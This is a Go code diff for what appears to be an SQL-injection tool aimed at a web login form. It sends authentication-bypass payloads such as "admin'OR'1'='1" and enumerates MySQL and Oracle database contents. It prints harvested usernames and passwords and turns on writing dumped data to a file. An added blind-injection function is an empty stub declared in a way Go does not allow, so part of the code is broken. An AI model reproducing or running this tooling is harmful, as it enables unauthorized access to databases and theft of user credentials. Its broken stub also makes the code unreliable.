@@ -32,6 +32,13 @@ func get_response(data url.Values) (int, string) {
 	return resp.StatusCode, string(body);
 }
 
+func blind_sqli_test() bool {
+	func oracle_time_delay() bool {
+
+	}
+	return true;
+}
+
 func check_sqli() bool {
 	data := url.Values {
 		"username":		{"''"},
@@ -60,8 +67,13 @@ func check_sqli() bool {
 
 	if (good && (body != "")) {
 		return true;
+	} else {
+		good = blind_sqli_test();
+		if (good) {
+			return true;
+		}
+		return false;
 	}
-	return false;
 }
 
 func get_version() string {
@@ -127,25 +139,6 @@ func user_data_enum() {
 	}
 }
 
-func oracle_user_data_enum() {
-	data := url.Values {
-		"username":		{"admin"},
-		"password":		{"test'OR'1'='1"},
-	};
-	code, body := get_response(data);
-	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
-		fmt.Println("************************ USER DATA DISCOVERED ***************************\n");
-		fmt.Println("************************** ENUMERATING NOW ******************************\n");
-		var parsed_data string = parse_data(body);
-		var json_data []Userdata;
-		json.Unmarshal([]byte(string(parsed_data)), &json_data);
-		fmt.Println("USER DATA DISCOVERED:\n");
-		for _, val := range json_data {
-			fmt.Printf(" ID: %-3s| USER: %-18s| PASSWORD: %-25s\n", val.Id, val.Username, val.Password);
-		}
-	}
-}
-
 func mysql_database_data_enum() {
 	data := url.Values {
 		"username":		{"admin'OR'1'='1"},
@@ -171,18 +164,18 @@ func oracle_database_data_enum() {
 	code, body := get_response(data);
 	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
 		fmt.Println(body);
-		//write_data(body, "database_info.oracle");
+		write_data(body, "database_info.oracle");
 	}
 }
 
 func mysql_enumeration() {
-	user_data_enum();
 	mysql_database_data_enum();
+	user_data_enum();
 }
 
 func oracle_enumeration() {
-	user_data_enum();
 	oracle_database_data_enum();
+	user_data_enum();
 }
 
 func main() {
